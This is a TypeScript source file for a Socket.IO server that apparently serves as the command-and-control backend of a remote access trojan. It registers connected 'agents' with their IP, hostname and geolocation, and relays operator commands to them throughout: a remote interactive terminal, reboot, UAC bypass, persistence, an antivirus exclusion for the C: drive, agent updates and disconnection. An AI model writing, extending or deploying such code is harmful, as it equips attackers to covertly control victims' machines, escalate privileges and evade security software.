import { Server } from 'socket.io';
import prisma from '../config/prisma';
import { getGeoFromIP } from '../utils/geolocate';

const clients = new Map<string, any>();

let ioInstance: Server | null = null;

export function initSocketServer(server: any) {
  const io = new Server(server, {
    cors: {
      origin: process.env.ALLOWED_ORIGIN || "http://localhost:3000",
      methods: ["GET", "POST"],
      credentials: true
    }
  });

  ioInstance = io;
  io.on('connection', async (socket: any) => {
    const ip = socket.handshake.address;
    const hostname = socket.handshake.query.hostname as string || 'unknown';
    const agentQuery = socket.handshake.query.agent;
    const isAgent = agentQuery === true || agentQuery === 'true';
    if (!isAgent) {
      console.log(`Non-agent connection ignored: ip=${ip}, hostname=${hostname}, agentQuery=${agentQuery}`);
      return;
    }
    const clientId = socket.id;

    clients.set(clientId, socket);

    // Fetch geolocation from IP
    const geo = await getGeoFromIP(ip);

    await prisma.client.upsert({
      where: { id: clientId },
      update: {
        status: 'ONLINE', ip, hostname, is_agent: true,
        country: geo?.country || null,
        city: geo?.city || null,
        lat: geo?.lat ?? null,
        lon: geo?.lon ?? null,
      },
      create: {
        id: clientId, status: 'ONLINE', ip, hostname, is_agent: true,
        country: geo?.country || null,
        city: geo?.city || null,
        lat: geo?.lat ?? null,
        lon: geo?.lon ?? null,
      }
    });

    console.log(`Client connected: id=${clientId}, hostname=${hostname}, ip=${ip}, geo=${JSON.stringify(geo)}`);

    socket.on('disconnect', async () => {
      clients.delete(clientId);
      await prisma.client.update({
        where: { id: clientId },
        data: { status: 'OFFLINE' }
      });
      console.log(`Client disconnected: ${clientId}`);
    });

    socket.on('result', async ({ taskId, output }: { taskId: string; output: string }) => {
      await prisma.taskResult.create({
        data: {
          taskId,
          output,
        }
      });
      console.log(`Result received for task ${taskId}`);
    });

    // Interactive terminal: receive input from frontend and relay to agent/client
    socket.on('terminal_input', ({ clientId, input }: { clientId: string; input: string }) => {
      // If this is a panel user, relay to the agent socket
      const targetSocket = clients.get(clientId);
      if (targetSocket && targetSocket !== socket) {
        targetSocket.emit('terminal_input', { input });
      }
    });

    // Interactive terminal: receive output from agent/client and relay to panel/frontend
    socket.on('terminal_output', ({ clientId, output }: { clientId: string; output: string }) => {
      // Only send output to the correct panel socket
      const targetSocket = clients.get(clientId);
      if (targetSocket) {
        targetSocket.emit('terminal_output', { clientId, output });
      }
    });

    // Reboot client: relay reboot command to agent
    socket.on('reboot_client', ({ clientId }: { clientId: string }) => {
      const targetSocket = clients.get(clientId);
      if (targetSocket) {
        targetSocket.emit('reboot');
        console.log(`Reboot command relayed to client ${clientId}`);
      }
    });

    // UAC Bypass: relay to agent
    socket.on('uac_bypass', ({ clientId, enable }: { clientId: string, enable: boolean }) => {
      const targetSocket = clients.get(clientId);
      if (targetSocket) {
        targetSocket.emit('uac_bypass', { enable });
        console.log(`UAC Bypass ${enable ? 'enabled' : 'disabled'} for client ${clientId}`);
      }
    });

    // Set Persistence: relay to agent
    socket.on('set_persistence', ({ clientId, enable }: { clientId: string, enable: boolean }) => {
      const targetSocket = clients.get(clientId);
      if (targetSocket) {
        targetSocket.emit('set_persistence', { enable });
        console.log(`Persistence ${enable ? 'enabled' : 'disabled'} for client ${clientId}`);
      }
    });

    // Set C: Exclusion: relay to agent
    socket.on('set_c_exclusion', ({ clientId, enable }: { clientId: string, enable: boolean }) => {
      const targetSocket = clients.get(clientId);
      if (targetSocket) {
        targetSocket.emit('set_c_exclusion', { enable });
        console.log(`C: Exclusion ${enable ? 'enabled' : 'disabled'} for client ${clientId}`);
      }
    });

    // Update Agent: relay to agent
    socket.on('update_agent', ({ clientId }: { clientId: string }) => {
      const targetSocket = clients.get(clientId);
      if (targetSocket) {
        targetSocket.emit('update_agent');
        console.log(`Update Agent command relayed to client ${clientId}`);
      }
    });

    // Disconnect client: forcibly disconnect agent
    socket.on('disconnect_client', ({ clientId }: { clientId: string }) => {
      const targetSocket = clients.get(clientId);
      if (targetSocket) {
        targetSocket.disconnect(true);
        console.log(`Disconnect command executed for client ${clientId}`);
      }
    });
  });

  return io;
}

export function getSocketServer(): Server | null {
  return ioInstance;
}

export function getConnectedClients() {
  return clients;
}